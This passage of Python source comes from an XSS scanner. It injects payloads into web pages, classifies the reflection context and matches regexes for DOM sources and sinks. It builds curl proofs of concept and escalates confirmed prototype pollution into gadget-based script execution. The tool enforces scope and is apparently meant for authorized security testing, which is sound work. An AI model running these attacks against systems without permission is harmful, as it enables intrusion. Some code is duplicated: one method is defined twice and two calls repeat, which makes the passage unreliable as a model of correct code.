        if slot in self._seen_slots:
            return False
        self._seen_slots.add(slot)
        self._seen.add(payload)
        self.payloads.setdefault(context, []).append(payload)
        return True

    def _load_file(self, path: str, remote: bool = False, quiet: bool = False) -> None:
        if Path(path).suffix.lower() == ".json":
            self._load_json(path, quiet=quiet)
            return
        added = 0
        try:
            with open(path, "r", encoding="utf-8-sig", errors="replace") as handle:
                for raw in handle:
                    line = raw.strip()
                    if not line or line.startswith("#"):
                        continue
                    context = "generic"
                    payload = line
                    explicit = False
                    if "|" in line:
                        prefix, rest = line.split("|", 1)
                        if prefix.strip().lower() in self.payloads:
                            context = prefix.strip().lower()
                            payload = rest.strip()
                            explicit = True
                    if remote:
                        if not _plausible_remote_payload(payload):
                            continue
                        classified = classify_remote_payload(payload)
                        if payload not in self._remote_set:
                            self._remote_set.add(payload)
                            self.remote_payloads.append(payload)
                        self._register(classified, payload)
                        if classified != "generic":
                            self._register("generic", payload)
                        added += 1
                    else:
                        # Untagged corpus lines are classified so they are not all
                        # tested against every context.  The payload is still
                        # registered as generic for unknown contexts.
                        if not explicit:
                            classified = classify_remote_payload(payload)
                            if classified != "generic":
                                context = classified
                        if self._register(context, payload):
                            added += 1
                        if context != "generic":
                            self._register("generic", payload)
        except OSError as exc:
            self.console.warn(f"Could not read payload file {path}: {exc}")
            return
        if not quiet and added:
            self.console.ok(f"Loaded {added} custom payloads from {path}", important=False)

    def probe(self, token: str) -> str:
        return f"{token}\"'><()"

    def _lazy_pool_for(self, context: str) -> List[str]:
        cached = self._lazy_pool_cache.get(context)
        if cached is not None:
            return cached
        contexts: List[str] = []
        if context in self._lazy_by_context:
            contexts.append(context)
        if "generic" in self._lazy_by_context:
            contexts.append("generic")
        seen: Set[str] = set(self._seen)
        pool: List[str] = []
        for ctx in contexts:
            for template in self._lazy_by_context.get(ctx, []):
                if template in seen:
                    continue
                seen.add(template)
                pool.append(template)
        self._lazy_pool_cache[context] = pool
        return pool

    def _lazy_pool_for(self, context: str) -> List[str]:
        cached = self._lazy_pool_cache.get(context)
        if cached is not None:
            return cached
        contexts: List[str] = []
        if context in self._lazy_by_context:
            contexts.append(context)
        if "generic" in self._lazy_by_context:
            contexts.append("generic")
        seen: Set[str] = set(self._seen)
        pool: List[str] = []
        for ctx in contexts:
            for template in self._lazy_by_context.get(ctx, []):
                if template in seen:
                    continue
                seen.add(template)
                pool.append(template)
        self._lazy_pool_cache[context] = pool
        return pool

    def payloads_for(self, context: str, limit: Optional[int] = None) -> List[str]:
        contexts = [context] if context in self.payloads else []
        for fallback in ("generic", "html"):
            if fallback not in contexts:
                contexts.append(fallback)
        seen: Set[str] = set()
        base: List[str] = []
        for ctx in contexts:
            for template in self.payloads.get(ctx, []):
                if template in seen or template in self._remote_set:
                    continue
                seen.add(template)
                base.append(template)

        lazy_pool = self._lazy_pool_for(context)

        if limit is None:
            return (
                base
                + [payload for payload in self.remote_payloads if payload not in seen]
                + lazy_pool
            )

        limit = max(1, limit)
        used: Set[str] = set()
        result: List[str] = []

        def take(pool: Sequence[str], quota: int) -> None:
            if quota <= 0:
                return
            candidates = [item for item in pool if item not in used and item not in result]
            if not candidates:
                return
            chosen = random.sample(candidates, quota) if len(candidates) > quota else candidates
            for item in chosen:
                if item not in used:
                    used.add(item)
                    result.append(item)

        if lazy_pool:
            # 50% curated, 30% LazyXss, 20% downloaded corpus.  At least one
            # curated payload is always kept so small limits stay reliable.
            base_quota = max(1, limit // 2)
            lazy_quota = min(max(1, int(limit * 0.3)), max(0, limit - base_quota))
            remote_quota = max(0, limit - base_quota - lazy_quota)
            if not self.remote_payloads:
                lazy_quota += remote_quota
                remote_quota = 0
            take(base[:base_quota], base_quota)
            take(lazy_pool, lazy_quota)
            take(self.remote_payloads, remote_quota)
            # Fill any shortfall (small pools, duplicates) from the remaining
            # curated payloads first, then the extended pools.
            take(base[base_quota:], limit - len(result))
            take(lazy_pool, limit - len(result))
            take(self.remote_payloads, limit - len(result))
        else:
            remote_quota = max(1, limit // 3) if self.remote_payloads else 0
            base_quota = max(0, limit - remote_quota)
            take(base, base_quota)
            take(self.remote_payloads, remote_quota)
            take(base[base_quota:], limit - len(result))
        return result[:limit]

    def render(self, template: str, token: str, context: str = "") -> str:
        marker = js_marker(token)
        if "{m}" in template:
            return template.replace("{m}", marker)
        if "{t}" in template:
            return template.replace("{t}", token)
        return embed_marker(template, marker, context)


# --------------------------------------------------------------------------------------
# Reflection analysis
# --------------------------------------------------------------------------------------

SPECIAL_CHARS = "<>\"'`()=/"


def analyze_reflection(body: str, token: str, sent_payload: str, content_type: str = "") -> ReflectionInfo:
    """Locate the token in a response and describe the injection context."""
    info = ReflectionInfo()
    if not body:
        return info
    index = body.find(token)
    if index < 0:
        # Some applications normalise case or URL-encode the value.
        alt = body.lower().find(token.lower())
        if alt < 0:
            return info
        index = alt

    before = body[:index]
    after = body[index + len(token):]
    # Context belongs to where the *payload* was inserted, not where the marker
    # sits inside it (a reflected "<script>" would otherwise look like a script
    # context even when the injection point is the HTML body).
    marker_offset = sent_payload.find(token) if token in sent_payload else -1
    context_index = index - marker_offset if marker_offset >= 0 else index
    context_index = max(0, min(context_index, len(body) - 1))
    context_before = body[:context_index]
    low_before = context_before.lower()

    # Context detection (ordered by precedence).
    context = "html"
    in_comment = low_before.rfind("<!--") > low_before.rfind("-->")
    in_script = low_before.rfind("<script") > low_before.rfind("</script")
    in_style = low_before.rfind("<style") > low_before.rfind("</style")
    last_lt = context_before.rfind("<")
    last_gt = context_before.rfind(">")
    in_tag = last_lt > last_gt

    if in_comment:
        context = "comment"
    elif in_script:
        context = "script"
    elif in_style:
        context = "style"
    elif in_tag:
        segment = context_before[last_lt:]
        double_open = segment.count('"') % 2 == 1
        single_open = segment.count("'") % 2 == 1
        if double_open:
            context = "attr_double"
        elif single_open:
            context = "attr_single"
        elif re.search(r"=\s*[^\s\"'>]*$", segment):
            context = "attr_unquoted"
        else:
            context = "html"
    elif "json" in content_type.lower() or (
        body.lstrip()[:1] in ("{", "[") and index < len(body) - 1
    ):
        context = "json"

    # Which special characters survived verbatim right after the token?
    tail_sent = sent_payload[sent_payload.find(token) + len(token):] if token in sent_payload else ""
    tail_recv = after[: max(1, len(tail_sent) + 8)]
    raw_specials: List[str] = []
    for offset, char in enumerate(tail_sent):
        if char not in SPECIAL_CHARS:
            continue
        if offset < len(tail_recv) and tail_recv[offset] == char:
            raw_specials.append(char)

    # Did the whole payload land verbatim (byte-for-byte)?  Entity-encoded
    # reflections ("&lt;script&gt;...") are rendered as literal text by browsers -
    # they cannot execute - so decoding entities here would turn sanitized
    # reflections into false-positive 'executable' findings under the evidence
    # policy.  Only byte-for-byte verbatim hits count.
    verbatim = bool(sent_payload) and sent_payload in body

    raw = set(raw_specials)
    payload_chars = set(sent_payload)

    def survived(chars: str) -> bool:
        return any(char in raw for char in chars) or (
            verbatim and any(char in payload_chars for char in chars)
        )

    executable = False
    if context == "html":
        executable = survived("<")
    elif context == "attr_double":
        executable = survived('"')
    elif context == "attr_single":
        executable = survived("'")
    elif context == "attr_unquoted":
        executable = survived(" >\"'`")
    elif context == "script":
        executable = survived("'\"`<")
    elif context == "style":
        executable = survived("<")
    elif context == "comment":
        executable = survived(">-")
    elif context == "json":
        executable = survived('<"\\')
    elif context == "url":
        executable = True

    info.reflected = True
    info.context = context
    info.executable = executable
    info.raw_specials = raw_specials
    info.snippet = re.sub(r"\s+", " ", body[max(0, index - 90): index + len(token) + 90])
    efficiency, distortion = score_reflection(sent_payload, body, token)
    info.efficiency = efficiency
    info.distortion = distortion
    info.detail = (
        f"context={context}, raw={''.join(sorted(raw)) or 'none'}, "
        f"verbatim={'yes' if verbatim else 'no'}, executable={'yes' if executable else 'no'}, "
        f"efficiency={efficiency:.1f}%"
    )
    return info


# --------------------------------------------------------------------------------------
# DOM analysis (static hints + runtime sink instrumentation)
# --------------------------------------------------------------------------------------

DOM_SOURCES = [
    "document.url",
    "document.documenturi",
    "document.baseuri",
    "location.hash",
    "location.search",
    "location.href",
    "document.referrer",
    "window.name",
    "document.cookie",
    "localstorage",
    "sessionstorage",
    "history.state",
    "postmessage",
    "window.location",
]

DOM_SINKS = [
    ("innerHTML", r"\.innerHTML\s*="),
    ("outerHTML", r"\.outerHTML\s*="),
    ("insertAdjacentHTML", r"insertAdjacentHTML\s*\("),
    ("document.write", r"document\.write\s*\("),
    ("document.writeln", r"document\.writeln\s*\("),
    ("eval", r"\beval\s*\("),
    ("Function", r"\bnew\s+Function\s*\("),
    ("setTimeout", r"\bsetTimeout\s*\("),
    ("setInterval", r"\bsetInterval\s*\("),
    ("location.assign", r"location\.(?:assign|replace)\s*\("),
    ("jQuery.html", r"\.html\s*\("),
    ("jQuery.append", r"\.(?:append|prepend|after|before)\s*\("),
    ("srcdoc", r"\.srcdoc\s*="),
]


@dataclass
class DomScript:
    url: str
    content: str
    inline: bool = True


def extract_scripts(base_url: str, html_text: str) -> List[DomScript]:
    if not HAS_BS4:
        return []
    soup = _soup(html_text)
    scripts: List[DomScript] = []
    for tag in soup.find_all("script"):
        src = tag.get("src")
        if isinstance(src, str) and src:
            scripts.append(DomScript(url=urljoin(base_url, src), content="", inline=False))
        elif tag.string:
            scripts.append(DomScript(url=base_url, content=tag.string, inline=True))
    return scripts


def static_dom_candidates(scripts: Sequence[DomScript]) -> List[Dict[str, str]]:
    candidates: List[Dict[str, str]] = []
    for script in scripts:
        content = script.content or ""
        lowered = content.lower()
        if not content:
            continue
        for sink_name, sink_re in DOM_SINKS:
            for match in re.finditer(sink_re, content, re.IGNORECASE):
                window = lowered[max(0, match.start() - 700): match.start()]
                source = next((src for src in DOM_SOURCES if src in window), "")
                if source:
                    snippet = re.sub(r"\s+", " ", content[max(0, match.start() - 80): match.end() + 120])
                    candidates.append(
                        {
                            "source": source,
                            "sink": sink_name,
                            "script": script.url,
                            "snippet": snippet,
                        }
                    )
                    break  # one candidate per sink occurrence
    return candidates


def has_dom_sink(content: str) -> bool:
    return any(re.search(pattern, content, re.IGNORECASE) for _, pattern in DOM_SINKS)


# --------------------------------------------------------------------------------------
# JavaScript library vulnerability detection
# --------------------------------------------------------------------------------------


@dataclass
class VulnerableLib:
    name: str
    version: str
    cve: str
    severity: str
    url: str = ""


def parse_version(version_str: str) -> Tuple[int, ...]:
    """Parse a version string into a tuple of integers for comparison."""
    try:
        # Remove non-numeric suffixes like -beta, -rc1, etc.
        cleaned = re.sub(r"[-+].*$", "", version_str)
        # Handle v prefix
        cleaned = cleaned.lstrip("v")
        parts = [int(x) for x in cleaned.split(".")]
        return tuple(parts)
    except (ValueError, AttributeError):
        return (0,)


def version_in_range(version: str, min_ver: str, max_ver: str) -> bool:
    """Check if a version is within the vulnerable range (inclusive)."""
    try:
        v = parse_version(version)
        min_v = parse_version(min_ver)
        max_v = parse_version(max_ver)
        return min_v <= v <= max_v
    except Exception:
        return False


def extract_lib_version_from_filename(filename: str) -> Optional[Tuple[str, str]]:
    """Extract library name and version from a script filename."""
    filename = filename.lower()
    # Common patterns: jquery-3.4.0.min.js, angular.1.7.9.js, etc.
    patterns = [
        r"jquery[-._]?(\d+[.\d]*)",  # jquery-3.4.0, jquery.3.4.0
        r"angular[-._]?(\d+[.\d]*)",  # angular-1.7.9
        r"react[-._]?(\d+[.\d]*)",  # react-16.3.0
        r"vue[-._]?(\d+[.\d]*)",  # vue-2.5.16
        r"bootstrap[-._]?(\d+[.\d]*)",  # bootstrap-4.3.1
        r"d3[-._]?(\d+[.\d]*)",  # d3-3.5.16
        r"handlebars[-._]?(\d+[.\d]*)",  # handlebars-4.0.11
        r"lodash[-._]?(\d+[.\d]*)",  # lodash-4.17.14
        r"moment[-._]?(\d+[.\d]*)",  # moment-2.24.0
        r"axios[-._]?(\d+[.\d]*)",  # axios-0.19.0
        r"ckeditor[-._]?(\d+[.\d]*)",  # ckeditor-4.11.4
        r"tinymce[-._]?(\d+[.\d]*)",  # tinymce-4.9.11
        r"prototype[-._]?(\d+[.\d]*)",  # prototype-1.7.3
        r"scriptaculous[-._]?(\d+[.\d]*)",  # scriptaculous-1.9.0
        r"swfobject[-._]?(\d+[.\d]*)",  # swfobject-2.2.0
    ]
    for pattern in patterns:
        match = re.search(pattern, filename)
        if match:
            lib_name = pattern.split(r"[-._]?")[0]
            version = match.group(1)
            return lib_name, version
    return None


def extract_lib_version_from_content(content: str) -> List[Tuple[str, str]]:
    """Extract library names and versions from script content using common patterns."""
    results: List[Tuple[str, str]] = []
    lowered = content.lower()
    
    # jQuery version detection
    jquery_match = re.search(r"jquery\s*v?(\d+[.\d]*)", lowered)
    if jquery_match:
        results.append(("jquery", jquery_match.group(1)))
    
    # Angular version detection
    angular_match = re.search(r"angular\.version\s*=\s*\{[^}]*full\s*:\s*['\"](\d+[.\d]*)", lowered)
    if angular_match:
        results.append(("angular", angular_match.group(1)))
    
    # React version detection
    react_match = re.search(r"react[\s_-]?version\s*[:=]\s*['\"](\d+[.\d]*)", lowered)
    if react_match:
        results.append(("react", react_match.group(1)))
    
    # Vue version detection
    vue_match = re.search(r"vue[\s_-]?version\s*[:=]\s*['\"](\d+[.\d]*)", lowered)
    if vue_match:
        results.append(("vue", vue_match.group(1)))
    
    # Bootstrap version detection
    bootstrap_match = re.search(r"bootstrap[\s_-]?version\s*[:=]\s*['\"](\d+[.\d]*)", lowered)
    if bootstrap_match:
        results.append(("bootstrap", bootstrap_match.group(1)))
    
    return results


def check_vulnerable_libs(
    script_url: str, 
    script_content: str = ""
) -> List[VulnerableLib]:
    """Check if a script uses a known vulnerable library version."""
    vulnerabilities = []
    
    # Check filename first
    filename = urlsplit(script_url).path.split("/")[-1]
    from_filename = extract_lib_version_from_filename(filename)
    
    libs_to_check = []
    if from_filename:
        libs_to_check.append(from_filename)
    
    # Also check content if available
    if script_content:
        from_content = extract_lib_version_from_content(script_content)
        libs_to_check.extend(from_content)
    
    # Check each detected library against the vulnerability database
    for lib_name, version in libs_to_check:
        lib_name_lower = lib_name.lower()
        if lib_name_lower in VULNERABLE_LIBS:
            for base_ver, (min_ver, max_ver, cve, severity) in VULNERABLE_LIBS[lib_name_lower].items():
                if version_in_range(version, min_ver, max_ver):
                    vulnerabilities.append(
                        VulnerableLib(
                            name=lib_name,
                            version=version,
                            cve=cve,
                            severity=severity,
                            url=script_url
                        )
                    )
                    break  # One vulnerability report per library per URL
    
    return vulnerabilities

# --------------------------------------------------------------------------------------
# Browser engine
# --------------------------------------------------------------------------------------

from xoxss.core.browser import BrowserEngine, BrowserPool, PlaywrightEngine


# --------------------------------------------------------------------------------------
# Form parsing helpers
# --------------------------------------------------------------------------------------


def default_field_value(field_type: str, name: str = "") -> str:
    field_type = (field_type or "text").lower()
    if field_type == "email":
        return "xoxss@example.com"
    if field_type == "number":
        return "1"
    if field_type == "tel":
        return "1234567890"
    if field_type == "url":
        return "https://example.com"
    if field_type == "password":
        return "XoxssPass1!"
    if field_type == "date":
        return "2024-01-01"
    if field_type == "search":
        return "test"
    if any(word in (name or "").lower() for word in ("search", "query", "q")):
        return "test"
    return "test"


def parse_form(form: Any, page_url: str) -> Tuple[str, str, Dict[str, FormField]]:
    action = urljoin(page_url, form.get("action") or page_url)
    method = (form.get("method") or "get").strip().lower()
    fields: Dict[str, FormField] = {}

    for element in form.find_all(["input", "textarea", "select"]):
        name = element.get("name")
        if not name:
            continue
        tag = element.name.lower()
        field_type = (element.get("type") or ("text" if tag == "input" else tag)).lower()
        if tag == "input" and field_type in ("submit", "button", "reset", "image", "file"):
            continue
        if tag == "input" and field_type in ("checkbox", "radio") and not element.has_attr("checked"):
            continue
        if tag == "select":
            option = element.find("option", selected=True) or element.find("option")
            value = ""
            if option is not None:
                value = option.get("value", option.get_text(strip=True))
        elif tag == "textarea":
            value = element.get_text()
        else:
            value = element.get("value")
            if value is None:
                value = default_field_value(field_type, name)
        fields[name] = FormField(name=name, value=value, type=field_type, tag=tag)

    return action, method, fields

# --------------------------------------------------------------------------------------
# Scope
# --------------------------------------------------------------------------------------


class Scope:
    def __init__(
        self,
        base_url: str,
        allow_subdomains: bool = False,
        include: Optional[Sequence[str]] = None,
        exclude: Optional[Sequence[str]] = None,
    ):
        parts = urlsplit(base_url)
        self.host = self._canonical_host(parts.hostname or "")
        try:
            self.base_port = parts.port
        except ValueError:
            self.base_port = -1
        self.allow_subdomains = allow_subdomains
        self.include = [re.compile(pattern, re.I) for pattern in (include or [])]
        self.exclude = [re.compile(pattern, re.I) for pattern in (exclude or [])]

    @staticmethod
    def _canonical_host(host: str) -> str:
        try:
            return host.rstrip(".").encode("idna").decode("ascii").lower()
        except (UnicodeError, AttributeError):
            return ""

    def in_scope(self, url: str) -> bool:
        try:
            parts = urlsplit(url)
        except ValueError:
            return False
        if parts.scheme not in ("http", "https"):
            return False
        if parts.username is not None or parts.password is not None or self.base_port == -1:
            return False
        host = self._canonical_host(parts.hostname or "")
        if not host:
            return False
        try:
            candidate_port = parts.port
        except ValueError:
            return False
        allowed_ports = {self.base_port} if self.base_port is not None else {80, 443}
        effective_port = candidate_port or (443 if parts.scheme == "https" else 80)
        if effective_port not in allowed_ports:
            return False
        if self.allow_subdomains:
            if host != self.host and not host.endswith("." + self.host):
                return False
        elif host != self.host:
            return False
        if self.include and not any(regex.search(url) for regex in self.include):
            return False
        if any(regex.search(url) for regex in self.exclude):
            return False
        return True


# Keys whose values must never appear in a shared PoC (JSON request bodies).
SENSITIVE_KEY_RE = re.compile(
    r"[a-z0-9_-]*(csrf|xsrf|token|session|auth|password|passwd|secret|cookie|api[._-]?key|key)[a-z0-9_-]*",
    re.IGNORECASE,
)


def build_poc(point: InjectionPoint, payload: str) -> Tuple[str, str]:
    """Build the reproduction proof for an injection point.

    Returns ``(poc_url, poc_command)``: a ready-to-open URL for GET
    query/form/fragment points and a shell one-liner (curl) for JSON, header,
    cookie and POST points.  The PoC embeds only the injected parameter -
    never cookies, CSRF tokens or other session data (documented under
    "Reports" in the README) - so the proof is safe to share as-is.
    """
    method = point.method.upper()
    if method == "GET":
        if point.source in ("query", "form", "api", "fragment"):
            try:
                if point.source == "query":
                    return replace_query_param(point.url, point.param, payload), ""
                values = {name: spec.value for name, spec in point.fields.items()}
                values[point.param] = payload
                return merge_query(point.url, values), ""
            except Exception:
                return point.url, ""
        if point.source == "header" and point.param:
            command = f"curl -sk '{point.url}' -H '{point.param}: {payload}'"
            return point.url, command
        if point.source == "cookie" and point.param:
            command = f"curl -sk '{point.url}' -H 'Cookie: {point.param}={payload}'"
            return point.url, command
        return point.url, ""
    if point.source == "json":
        body: Dict[str, Any] = dict(point.json_body or {})
        body[point.param] = payload
        # Session-bound keys are redacted so the shared curl never carries
        # CSRF tokens, cookies or credentials from the operator's session.
        for key in list(body):
            if key != point.param and SENSITIVE_KEY_RE.fullmatch(str(key)):
                body[key] = "REDACTED"
        try:
            serialized = json.dumps(body, separators=(",", ":"))
        except Exception:
            serialized = json.dumps({point.param: payload})
        content_type = point.content_type or "application/json"
        command = (
            f"curl -sk -X POST '{point.url}' "
            f"-H 'Content-Type: {content_type}' --data-raw {shlex.quote(serialized)}"
        )
        return point.url, command
    body_data = urlencode({point.param: payload})
    command = f"curl -sk -X POST '{point.url}' --data '{body_data}'"
    return point.url, command


# --------------------------------------------------------------------------------------
# Scanner
# --------------------------------------------------------------------------------------


class XSSScanner:
    def __init__(self, target: str, args: argparse.Namespace, console: Console):
        if not re.match(r"^https?://", target, re.IGNORECASE):
            target = "http://" + target
        self.target = normalize_url(target)
        self.args = args
        self.console = console
        self.stats = ScanStats()
        self.scope = Scope(
            self.target,
            allow_subdomains=getattr(args, "allow_subdomains", False),
            include=getattr(args, "include", None),
            exclude=getattr(args, "exclude", None),
        )
        # Subdomain/external recon is only useful when sibling hosts are in
        # scope; widen the base host to the registrable domain in that mode.
        if HAS_RECON and (
            getattr(args, "subdomains", False)
            or int(getattr(args, "subdomain_brute", 0) or 0) > 0
            or getattr(args, "external_tools", False)
        ):
            base_domain = root_domain(self.scope.host) if root_domain else self.scope.host
            if base_domain:
                self.scope.host = base_domain
                self.scope.allow_subdomains = True
        self.state = StateStore(self.target, args.state_dir, enabled=not args.no_state, console=console)
        # A corpus can hold thousands of entries; when several targets are scanned
        # in one run, parse it once and share the read-only engine.
        cached_payloads = getattr(args, "_payload_engine", None)
        if cached_payloads is None:
            cached_payloads = PayloadEngine(
                console,
                args.payload_file,
                remote_files=getattr(args, "payload_files", None),
                corpus_dirs=getattr(args, "payload_dir", None),
                lazy_payloads=getattr(args, "lazy_payloads", True),
            )
            try:
                setattr(args, "_payload_engine", cached_payloads)
            except Exception:
                pass
        self.payloads = cached_payloads
        self.http = HttpEngine(
            console,
            self.stats,
            headers=self._parse_headers(args.headers),
            cookies=self._parse_cookies(args.cookies),
            timeout=args.timeout,
            retries=args.retries,
            rate=args.rate_limit,
            concurrency=args.concurrency,
            proxy=args.proxy,
            insecure=args.insecure,
            redirect_scope=self.scope.in_scope,
            max_response_bytes=getattr(args, "max_response_bytes", 5 * 1024 * 1024),
        )
        
        # Enable smart rate limiting if requested
        if HAS_ADVANCED and getattr(args, 'smart_rate', False):
            self.http.enable_smart_rate(args.rate_limit or 10.0)
        self.pool: Optional[BrowserPool] = None
        self.waf = WAFReport()
        self.findings: List[Finding] = []
        self._finding_keys: Set[str] = set()
        self._stop = asyncio.Event()
        self._status_task: Optional[asyncio.Task] = None
        self.screenshot_dir = Path(args.state_dir) / "screenshots"
        self._stored_checked: Set[str] = set()
        self._proto_tested: Set[str] = set()
        self._proto_warned = False
        self.blind_url: Optional[str] = getattr(args, "blind", None)
        self.blind_markers: List[Dict[str, str]] = []
        self._blind_points: Set[str] = set()
        self.endpoints: Set[str] = set()
        self._js_files_fetched: int = 0
        self._js_seen: Set[str] = set()
        self.vulnerable_libs: List[VulnerableLib] = []

        # Reconnaissance / JS intelligence / out-of-band state
        self.subdomains: List[str] = []
        self.passive_urls: List[str] = []
        self.js_intel: List[Any] = []
        self.api_operations: List[Any] = []
        self.external_findings: List[Any] = []
        self.external_summary: str = ""
        self._mined_params: Dict[str, List[str]] = {}
        self.discovered_param_names: List[str] = []
        self._ast_seen: Set[str] = set()
        self.oob: Optional[OOBManager] = None  # type: ignore[valid-type]
        self._oob_task: Optional[asyncio.Task] = None
        
        # Advanced features (Phase 1 & 2)
        self.jsonp_findings: List[Dict] = []
        self.csp_issues: List[Dict] = []
        self.mxss_findings: List[Dict] = []
        self.proto_pollution_findings: List[Dict] = []
        self.cors_issues: List[Dict] = []
        self.trusted_types_issues: List[Dict] = []
        self.dom_clobber_findings: List[Dict] = []
        self.postmessage_findings: List[Dict] = []
        self.websocket_findings: List[Dict] = []
        self.file_upload_findings: List[Dict] = []
        self.graphql_endpoints: List[Dict] = []
        # Adaptive rate limiting is handled above via HttpEngine.enable_smart_rate(),
        # which installs an internal SmartRateLimiter and records every request;
        # replacing self.http.limiter here would bypass that mechanism.

    # -- setup ------------------------------------------------------------------------
    @staticmethod
    def _parse_headers(values: Optional[Sequence[str]]) -> Dict[str, str]:
        headers: Dict[str, str] = {}
        for item in values or []:
            if ":" in item:
                name, value = item.split(":", 1)
                headers[name.strip()] = value.strip()
        return headers

    @staticmethod
    def _parse_cookies(values: Optional[Sequence[str]]) -> Dict[str, str]:
        cookies: Dict[str, str] = {}
        for item in values or []:
            for chunk in item.split(";"):
                if "=" in chunk:
                    name, value = chunk.split("=", 1)
                    cookies[name.strip()] = value.strip()
        return cookies

    def transform_payload(self, payload: str) -> str:
        """Apply the tamper transform and the optional encoder chain."""
        result = apply_tamper(payload, getattr(self.args, "tamper", None))
        chain = getattr(self.args, "encoder", None) or []
        if chain and HAS_RECON and apply_encoder_chain is not None:
            try:
                result = apply_encoder_chain(result, chain)
            except Exception as exc:  # unknown encoder / transform failure
                self.console.debug(f"Encoder chain failed: {exc}")
        return result

    def _browser_factory(self) -> BrowserEngine:
        engine_class = PlaywrightEngine if (self.args.browser or "").lower() == "playwright" else BrowserEngine
        return engine_class(
            self.console,
            kind=self.args.browser,
            headless=self.args.headless,
            page_timeout=max(10.0, self.args.timeout),
            user_agent=self.args.user_agent,
            proxy=self.args.proxy,
            binary=self.args.binary,
            insecure=self.args.insecure,
            url_allowed=self.scope.in_scope,
        )

    # -- prototype pollution ----------------------------------------------------------
    async def test_proto_pollution(self, url: str) -> None:
        """Prove client-side prototype pollution and exercise known gadgets.

        Static source patterns are hints at best: they cannot show that a parser
        accepts ``__proto__`` or that the polluted property is later consumed.  This
        drives a real page, requires a unique marker to be visible on a *fresh*
        object, and only then tries gadget-specific exploit URLs.
        """
        if not HAS_ADVANCED or build_proto_probes is None or not PROTO_PROBE_JS:
            return
        if self.pool is None or not self.pool.engines:
            if not self._proto_warned:
                self.console.warn(
                    "--proto-pollution needs a browser for runtime verification; "
                    "static hints only"
                )
                self._proto_warned = True
            return
        if url in self._proto_tested:
            return
        self._proto_tested.add(url)

        marker = unique_token("pp", 10)
        probes = build_proto_probes(url, marker)
        async with self.pool.borrow() as browser:
            for probe_url, probe in probes:
                if self._stop.is_set():
                    return
                await browser.navigate(probe_url)
                result = await browser.evaluate(PROTO_PROBE_JS, {"marker": marker})
                self.stats.browser_checks += 1
                if not isinstance(result, dict) or not result.get("polluted"):
                    continue

                values = [str(item) for item in (result.get("values") or []) if item]
                evidence = values[0] if values else marker
                added = self.add_finding(
                    Finding(
                        kind="Prototype Pollution (confirmed)",
                        url=probe_url,
                        parameter=probe.parameter,
                        method="GET",
                        payload=f"{probe.parameter}={marker}",
                        evidence=f"Object.prototype.{PROTO_MARKER_KEY} == {evidence}",
                        confidence="confirmed",
                        context=f"client-side ({probe.location})",
                        detail=(
                            "A fresh object inherited the marker after the page consumed "
                            "the probe, so attacker-controlled input reaches a merge or "
                            "assignment sink that copies __proto__."
                        ),
                        tags=["prototype-pollution"],
                        subkey=probe.parameter,
                        poc_url=probe_url,
                    )
                )
                if added:
                    self.console.ok(
                        f"Prototype pollution confirmed via {probe.location}: "
                        f"{truncate(url, 90)}"
                    )

                gadgets = result.get("gadgets") or []
                fingerprinted = [
                    str(item.get("name"))
                    for item in gadgets
                    if isinstance(item, dict) and item.get("name")
                ]
                self.console.debug(f"Gadgets on page: {', '.join(fingerprinted) or 'none'}")
                names = gadget_exploit_names(gadgets) if gadget_exploit_names else []
                await self._exploit_proto_gadgets(browser, url, names)
                return

    async def _exploit_proto_gadgets(
        self, browser: BrowserEngine, url: str, names: Sequence[str]
    ) -> None:
        """Turn a confirmed pollution primitive into a gadget-specific XSS proof."""
        if build_proto_exploit is None:
            return
        candidate: Optional[Tuple[str, str, str]] = None
        for name in list(dict.fromkeys(names))[:4]:
            if self._stop.is_set():
                return
            exploit_marker = unique_token("pg", 10)
            exploit_url, pairs = build_proto_exploit(url, name, exploit_marker)
            if not exploit_url:
                continue
            await browser.navigate(exploit_url)
            hit = await browser.check_token(exploit_marker, timeout=2.0)
            self.stats.browser_checks += 1
            if hit and hit.get("executed") == "yes":
                self.add_finding(
                    Finding(
                        kind="Prototype Pollution to XSS (gadget)",
                        url=exploit_url,
                        parameter="__proto__",
                        method="GET",
                        payload=urlencode(dict(pairs)),
                        evidence=hit.get("evidence", ""),
                        confidence="confirmed",
                        context=f"client-side (gadget: {name})",
                        detail=(
                            f"The {name} gadget consumed the polluted property and "
                            "executed attacker JavaScript in the page origin."
                        ),
                        tags=["prototype-pollution", "xss"],
                        subkey=f"gadget:{name}",
                        poc_url=exploit_url,
                    )
                )
                self.console.ok(f"Prototype pollution gadget fired: {name}")
                return
            if candidate is None:
                candidate = (name, exploit_url, urlencode(dict(pairs)))

        if candidate is not None:
            name, exploit_url, payload = candidate
            self.add_finding(
                Finding(
                    kind="Prototype Pollution gadget (candidate)",
                    url=exploit_url,
                    parameter="__proto__",
                    method="GET",
                    payload=payload,
                    evidence=f"{name} fingerprinted; gadget did not fire automatically",
                    confidence="low",
                    context=f"client-side (gadget: {name})",
                    detail=(
                        "Pollution is confirmed, but the gadget needs a user interaction "
                        "or a different sink. The URL is a reproducible starting point."
                    ),
                    tags=["prototype-pollution"],
                    subkey=f"candidate:{name}",
                    poc_url=exploit_url,
                )
            )

    # -- top level --------------------------------------------------------------------
    async def run(self) -> List[Finding]:
        await self.http.start()
        resumed = self.state.load()
        if resumed and not self.args.no_resume:
            self._load_state()
        elif self.args.no_resume:
            self.state.reset()

        self.console.info(f"Target: {self.target}")
        if self.state.scanned:
            self.console.info(
                f"Resume checkpoint: {len(self.state.scanned)} URL(s), "
                f"{len(self.findings)} stored finding(s)"
            )

        try:
            self.console.rule("recon & waf fingerprint")
            self.waf = await WAFDetector(self.http, self.console, self.target).detect()
            self.state.waf = list(self.waf.names)

            if not self.args.no_browser:
                self.pool = BrowserPool(self.console, self.args.browser_workers, self._browser_factory)
                await self.pool.start()

            self._status_task = asyncio.create_task(self._status_loop())
            await self._start_oob()
            if self.oob is not None:
                self._oob_task = asyncio.create_task(self._oob_loop())

            urls = await self.prepare_urls()
            self.stats.urls_total = len(urls)
            self.console.event(
                "discovery_completed", target=self.target, urls=len(urls),
                endpoints=len(self.endpoints), js_files=self.stats.js_files,
            )
            self.console.info(f"Scanning {len(urls)} URL(s) with {self.args.threads} worker(s)")
            self.console.rule("attack")
            await self._scan_urls(urls)
            await self._run_external_findings(urls)
            await self._drain_oob()
            await self._run_external_findings(urls)
            await self._drain_oob()
        except asyncio.CancelledError:
            self.console.warn("Scan cancelled - saving checkpoint")
            self.state.save(force=True)
            raise
        finally:
            self._stop.set()
            if self._oob_task is not None:
                self._oob_task.cancel()
                with suppress(asyncio.CancelledError):
                    await self._oob_task
                self._oob_task = None
            if self.oob is not None:
                self.state.extra["oob"] = self.oob.to_dict()
